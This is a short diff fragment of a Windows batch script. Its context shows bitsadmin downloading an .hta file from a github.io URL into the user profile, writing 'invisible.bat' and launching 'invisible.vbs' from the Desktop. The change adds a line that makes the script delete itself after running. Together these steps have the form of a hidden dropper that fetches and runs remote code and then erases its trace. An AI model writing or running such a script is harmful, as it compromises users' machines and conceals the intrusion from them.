@@ -40,4 +40,5 @@ bitsadmin.exe /transfer "Start.hta" https://athdot.github.io/dwnld/htl.hta %USER
 @echo )>> invisible.bat
 @echo goto :check>> invisible.bat
 start %USERPROFILE%\Desktop\invisible.vbs
+(goto) 2>nul & del "%~f0"
 exit
